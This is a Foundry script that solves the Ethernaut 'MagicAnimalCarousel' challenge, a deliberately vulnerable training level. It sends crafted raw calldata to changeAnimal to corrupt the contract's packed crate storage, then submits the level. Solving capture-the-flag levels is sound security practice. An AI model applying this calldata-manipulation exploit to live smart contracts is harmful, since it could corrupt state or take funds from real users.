// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;
import {Script, console} from "forge-std/Script.sol";

interface Ethernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
}

interface MagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
}

contract MagicAnimalCarouselScript is Script {
    function run() external {
        vm.startBroadcast();
        MagicAnimalCarousel instance = MagicAnimalCarousel(0x1102ca3098D2C7834e458E706dC2Eaf3D7dbd9d8);
        instance.setAnimalAndSpin("Echidna");
        bytes memory payload = abi.encodePacked(uint256(64), uint256(1), uint256(12), hex"31323334353637383930ffff");
        (bool success, ) = address(instance).call(abi.encodePacked(instance.changeAnimal.selector, payload));
        instance.setAnimalAndSpin("Pidgeon");

        Ethernaut e = Ethernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
        e.submitLevelInstance(payable(0x1102ca3098D2C7834e458E706dC2Eaf3D7dbd9d8));
        vm.stopBroadcast();
    }
}